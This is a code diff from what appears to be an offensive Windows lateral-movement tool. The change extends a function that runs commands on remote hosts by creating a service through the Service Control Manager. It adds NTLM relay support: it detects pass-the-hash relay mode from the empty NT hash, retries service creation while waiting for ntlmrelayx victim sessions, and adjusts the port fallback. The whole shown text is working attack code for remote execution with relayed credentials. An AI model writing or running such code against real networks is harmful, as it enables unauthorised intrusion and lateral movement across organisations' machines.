@@ -156,13 +156,29 @@ def _scm_exec(host, auth, command, cwd, timeout=120, verbose=False):
         print(f'  [scm] svc={svc_name}  out={out_win}', file=sys.stderr)
         print(f'  [scm] bin={bin_path}',                 file=sys.stderr)
 
-    # Create: try named pipe (port 445, relay-compatible) first; some targets
-    # return ERROR_INVALID_PARAMETER for CreateService over named pipe — fall
-    # back to TCP (port 135) in that case.  Always use the resolved IP so
-    # Titanis' .NET resolver doesn't get only IPv6 AAAA records.
-    _, rc = run(SCM, 'create', auth, [smb_host, svc_name, bin_path, '-PreferSmb'],
-                verbose=verbose, timeout=30)
-    if rc != 0:
+    # Detect relay mode: empty-NT-hash PtH forces NTLM-only and lets ntlmrelayx
+    # match the session.  In relay mode we only retry port 445 (-PreferSmb)
+    # because port 135 goes through ntlmrelayx direct-forward (no relay auth),
+    # which fails authentication with the dummy hash.
+    relay_mode = ('31d6cfe0d16ae931b73c59d7e0c089c0' in auth)
+
+    # Create: named pipe / port 445 first (relay-compatible).
+    # ntlmrelayx relay sessions come and go as victim machines re-authenticate;
+    # retry up to 3 times with a 4-second gap so a momentarily-absent session
+    # can refresh.  In non-relay mode, fall back to TCP/135 once all retries
+    # fail (some targets return ERROR_INVALID_PARAMETER for CreateService over
+    # named pipe).
+    rc = 1
+    for attempt in range(3):
+        _, rc = run(SCM, 'create', auth, [smb_host, svc_name, bin_path, '-PreferSmb'],
+                    verbose=verbose, timeout=30)
+        if rc == 0:
+            break
+        if attempt < 2:
+            print(f'  [scm] create failed (rc={rc}) — waiting for relay session...',
+                  file=sys.stderr)
+            time.sleep(4)
+    if rc != 0 and not relay_mode:
         _, rc = run(SCM, 'create', auth, [smb_host, svc_name, bin_path],
                     verbose=verbose, timeout=30)
     if rc != 0:
